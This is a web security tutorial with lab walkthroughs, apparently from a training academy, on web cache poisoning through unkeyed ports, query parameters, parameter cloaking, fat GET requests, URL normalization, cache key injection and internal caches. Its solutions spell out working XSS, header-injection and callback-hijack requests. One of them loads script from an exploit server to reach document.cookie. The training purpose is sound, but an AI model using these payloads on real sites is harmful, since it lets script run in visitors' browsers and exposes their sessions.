# Exploiting cache implementation flaws

## Cache key flaws

Generally speaking, websites take most of their input from the URL path and the query string.

## Cache probing methodology

The methodology involves the following steps:

- Identify a suitable cache oracle
- Probe key handling
- Identify an exploitable gadget

## Identify a suitable cache oracle

 A cache oracle is simply a page or endpoint that provides feedback about the cache's behavior. 
 This feedback could take various forms, such as:

- An HTTP header that explicitly tells you whether you got a cache hit
- Observable changes to dynamic content
- Distinct response times

## Probe key handling

## Exploiting cache implementation flaws

## Identify an exploitable gadget

These gadgets will often be classic client-side vulnerabilities, such as reflected XSS and open redirects. By combining these with web cache poisoning, you can massively escalate the severity of these attacks, turning a reflected vulnerability into a stored one. Instead of having to induce a victim to visit a specially crafted URL, your payload will automatically be served to anybody who visits the ordinary, perfectly legitimate URL.

## Exploiting cache key flaws

### Unkeyed port

The Host header is often part of the cache key and, as such, initially seems an unlikely candidate for injecting any kind of payload. However, some caching systems will parse the header and exclude the port from the cache key.

A redirect URL was dynamically generated based on the Host header. This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request. All users who browsed to the home page would be redirected to a dud port, effectively taking down the home page until the cache expired.

This kind of attack can be escalated further if the website allows you to specify a non-numeric port. You could use this to inject an XSS payload, for example.

### Unkeyed query string

Like the Host header, the request line is typically keyed. However, one of the most common cache-key transformations is to exclude the entire query string.

### Detecting an unkeyed query string

If the response explicitly tells you whether you got a cache hit or not, this transformation is relatively simple to spot - but what if it doesn't? This has the side-effect of making dynamic pages appear as though they are fully static because it can be hard to know whether you are communicating with the cache or the server.

To identify a dynamic page, you would normally observe how changing a parameter value has an effect on the response. But if the query string is unkeyed, most of the time you would still get a cache hit, and therefore an unchanged response, regardless of any parameters you add. Clearly, this also makes classic cache-buster query parameters redundant.

Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that doesn't interfere with the application's behavior. Some typical examples include:

```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```

### Web cache poisoning via an unkeyed query string

This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser.

**Solution:**
1. With Burp running, load the website's home page. In Burp, go to "Proxy" > "HTTP history". Find the GET request for the home page. Notice that this page is a potential cache oracle. Send the request to Burp Repeater.
2. Add arbitrary query parameters to the request. Observe that you can still get a cache hit even if you change the query parameters. This indicates that they are not included in the cache key.
3. Notice that you can use the Origin header as a cache buster. Add it to your request.
4. When you get a cache miss, notice that your injected parameters are reflected in the response. If the response to your request is cached, you can remove the query parameters and they will still be reflected in the cached response.
5. Add an arbitrary parameter that breaks out of the reflected string and injects an XSS payload:
    ```GET /?evil='/><script>alert(1)</script>```
6. Keep replaying the request until you see your payload reflected in the response and X-Cache: hit in the headers.
7. To simulate the victim, remove the query string from your request and send it again (while using the same cache buster). Check that you still receive the cached response containing your payload.
8. Remove the cache-buster Origin header and add your payload back to the query string. Replay the request until you have poisoned the cache for normal users. Confirm this attack has been successful by loading the home page in the browser and observing the popup.
9. The lab will be solved when the victim user visits the poisoned home page. You may need to re-poison the cache if the lab is not solved after 35 seconds.

## Unkeyed query parameters

UTM parameters like utm_content are good candidates to check during testing. Parameters that have been excluded from the cache key are unlikely to have a significant impact on the response. The chances are there won't be any useful gadgets that accept input from these parameters. 

### Web cache poisoning via an unkeyed query parameter

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.

**Solution:**
1. Observe that the home page is a suitable cache oracle. Notice that you get a cache miss whenever you change the query string. This indicates that it is part of the cache key. Also notice that the query string is reflected in the response.
2. Add a cache-buster query parameter.
3. Use Param Miner's "Guess GET parameters" feature to identify that the parameter utm_content is supported by the application.
4. Confirm that this parameter is unkeyed by adding it to the query string and checking that you still get a cache hit. Keep sending the request until you get a cache miss. Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string.
5. Send a request with a utm_content parameter that breaks out of the reflected string and injects an XSS payload:
    ```GET /?utm_content='/><script>alert(1)</script>```
6. Once your payload is cached, remove the utm_content parameter, right-click on the request, and select "Copy URL". Open this URL in the browser and check that the alert() is triggered when you load the page.
7. Remove your cache buster, re-add the utm_content parameter with your payload, and replay the request until the cache is poisoned for normal users. The lab will be solved when the victim user visits the poisoned home page.

## Cache parameter cloaking

Let's assume that the algorithm for excluding parameters from the cache key behaves in this way, but the server's algorithm only accepts the first ? as a delimiter. Consider the following request:

```GET /?example=123?excluded_param=bad-stuff-here```

In this case, the cache would identify two parameters and exclude the second one from the cache key. However, the server doesn't accept the second ? as a delimiter and instead only sees one parameter, example, whose value is the entire rest of the query string, including our payload. If the value of example is passed into a useful gadget, we have successfully injected our payload without affecting the cache key.

### Exploiting parameter parsing quirks

### Parameter cloaking

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.

To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim's browser.

**Solution:**
1. Identify that the *utm_content* parameter is supported. Observe that it is also excluded from the cache key.
2. Notice that if you use a semicolon (*;*) to append another parameter to *utm_content*, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
3. Observe that every page imports the script */js/geolocate.js*, executing the callback function *setCountryCookie()*. Send the request *GET /js/geolocate.js?callback=setCountryCookie* to Burp Repeater.
4. Notice that you can control the name of the function that is called on the returned data by editing the *callback* parameter. However, you can't poison the cache for other users in this way because the parameter is keyed.
5. Study the cache behavior. Observe that if you add duplicate *callback* parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second *callback* parameter to the *utm_content* parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:
    ```
    GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

    HTTP/1.1 200 OK
    X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
    â€¦
    arbitraryFunction({"country" : "United Kingdom"})
    ```
6. Send the request again, but this time pass in *alert(1)* as the callback function:
    ```GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)```
7. Get the response cached, then load the home page in the browser. Check that the *alert()* is triggered.
8. Replay the request to keep the cache poisoned. The lab will solve when the victim user visits any page containing this resource import URL.

## Exploiting fat GET support

This might allow you to poison the cache with a *POST* request containing a malicious payload in the body. Your payload would then even be served in response to users' *GET* requests.

Although this scenario is pretty rare, you can sometimes achieve a similar effect by simply adding a body to a GET request to create a "fat" GET request:

```
GET /?param=innocent HTTP/1.1
â€¦
param=bad-stuff-here
```

This is only possible if a website accepts *GET* requests that have a body, but there are potential workarounds. You can sometimes encourage *"fat GET"* handling by overriding the HTTP method, for example:

```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
â€¦
param=bad-stuff-here
```

As long as the *X-HTTP-Method-Override* header is unkeyed, you could submit a *pseudo-POST* request while preserving a *GET* cache key derived from the request line.

### Web cache poisoning via a fat GET request

This lab is vulnerable to web cache poisoning. It accepts *GET* requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes *alert(1)* in the victim's browser.

**Solution:**
1. Observe that every page imports the script ```/js/geolocate.js```, executing the callback function ```setCountryCookie()```. Send the request ```GET /js/geolocate.js?callback=setCountryCookie``` to Burp Repeater.
2. Notice that you can control the name of the function that is called in the response by passing in a duplicate callback parameter via the request body. Also notice that the cache key is still derived from the original callback parameter in the request line:
    ```
    GET /js/geolocate.js?callback=setCountryCookie
    â€¦
    callback=arbitraryFunction

    HTTP/1.1 200 OK
    X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
    â€¦
    arbitraryFunction({"country" : "United Kingdom"})
    ```
3. Send the request again, but this time pass in *alert(1)* as the callback function. Check that you can successfully poison the cache.
4. Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL.

## Exploiting dynamic content in resource imports

For example, consider a page that reflects the current query string in an import statement:

```
GET /style.css?excluded_param=123);@importâ€¦ HTTP/1.1

HTTP/1.1 200 OK
â€¦
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@importâ€¦
```

You could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any pages that import */style.css*.

If the page importing the CSS file doesn't specify a doctype, you can maybe even exploit static CSS files. Given the right configuration, browsers will simply scour the document looking for CSS and then execute it. This means that you can occasionally poison static CSS files by triggering a server error that reflects the excluded query parameter:

```
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
â€¦
```

This request was blocked due toâ€¦alert(1){}*{color:red;}

## Normalized cache keys

Some caching implementations normalize keyed input when adding it to the cache key. In this case, both of the following requests would have the same key:

```
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```

This behavior can allow you to exploit these otherwise "unexploitable" XSS vulnerabilities. If you send a malicious request using Burp Repeater, you can poison the cache with an unencoded XSS payload. When the victim visits the malicious URL, the payload will still be URL-encoded by their browser; however, once the URL is normalized by the cache, it will have the same cache key as the response containing your unencoded payload.

### URL normalization

This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim.

**Solution:**
1. In Burp Repeater, browse to any non-existent path, such as ```GET /random```. Notice that the path you requested is reflected in the error message.
2. Add a suitable reflected XSS payload to the request line:
    ```GET /random</p><script>alert(1)</script><p>foo```
3. Notice that if you request this URL in the browser, the payload doesn't execute because it is URL-encoded.
4. In Burp Repeater, poison the cache with your payload and then immediately load the URL in the browser. This time, the *alert()* is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
5. Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link.

## Cache key injection

You will sometimes discover a client-side vulnerability in a keyed header. This is also a classic "unexploitable" issue that can sometimes be exploited using cache poisoning.

Keyed components are often bundled together in a string to create the cache key. If the cache doesn't implement proper escaping of the delimiters between the components, you can potentially exploit this behavior to craft two different requests that have the same cache key.

The following example uses double-underscores to delimit different components in the cache key and does not escape them. You can exploit this by first poisoning the cache with a request containing your payload in the corresponding keyed header:

```
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__

<script>â€¦'-alert(1)-'â€¦</script>
```

If you then induce a victim user to visit the following URL, they would be served the poisoned response:

```
GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
X-Cache: hit

<script>â€¦'-alert(1)-'â€¦</script>
```

### Cache key injection

This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome.

To solve the lab, combine the vulnerabilities to execute *alert(1)* in the victim's browser. Note that you will need to make use of the Pragma: *x-get-cache-key* header in order to solve this lab.

**Solution:**
1. Observe that the redirect at */login* excludes the parameter *utm_content* from the cache key using a flawed regex. This allows you append arbitrary unkeyed content to the lang parameter:

    ```/login?lang=en?utm_content=anything```
2. Observe that the page at */login/* has an import from */js/localize.js*. This is vulnerable to client-side parameter pollution via the lang parameter because it doesn't URL-encode the value.
3. Observe that the login page references an endpoint at */js/localize.js* that is vulnerable to response header injection via the Origin request header, provided the cors parameter is set to 1.
4. Use the *Pragma: x-get-cache-key* header to identify that the server is vulnerable to cache key injection, meaning the header injection can be triggered via a crafted URL.
5. Combine these four behaviors by poisoning the cache with following two requests:
    ```
    GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
    Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

    GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
    ```
6. This will poison */login?lang=en* such that it redirects to a login page with a poisoned localization import that executes *alert(1)*, solving the lab.


### Internal cache poisoning

This lab is vulnerable to web cache poisoning. It uses multiple layers of caching. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the internal cache so that the home page executes *alert(document.cookie)* in the victim's browser.

**Solution:**
1. Notice that the home page is a suitable cache oracle and send the *GET /* request to Burp Repeater.
2. Observe that any changes to the query string are always reflected in the response. This indicates that the external cache includes this in the cache key. Use Param Miner to add a dynamic cache-buster query parameter. This will allow you to bypass the external cache.
3. Observe that the *X-Forwarded-Host* header is supported. Add this to your request, containing your exploit server URL:
    ```X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net```
4. Send the request. If you get lucky with your timing, you will notice that your exploit server URL is reflected three times in the response. However, most of the time, you will see that the URL for the canonical link element and the *analytics.js* import now both point to your exploit server, but the *geolocate.js* import URL remains the same.
5. Keep sending the request. Eventually, the URL for the *geolocate.js* resource will also be overwritten with your exploit server URL. This indicates that this fragment is being cached separately by the internal cache. Notice that you've been getting a cache hit for this fragment even with the cache-buster query parameter - the query string is unkeyed by the internal cache.
6. Remove the *X-Forwarded-Host* header and resend the request. Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. This indicates that the header is unkeyed by the internal cache but keyed by the external one. Therefore, you can poison the internally cached fragment using this header.
7. Go to the exploit server and create a file at */js/geolocate.js* containing the payload *alert(document.cookie)*. Store the exploit.
8. Back in Burp Repeater, disable the dynamic cache buster in the query string and re-add the *X-Forwarded-Host* header to point to your exploit server.
9. Send the request over and over until all three of the dynamic URLs in the response point to your exploit server. Keep replaying the request to keep the cache poisoned until the victim user visits the page and the lab is solved.
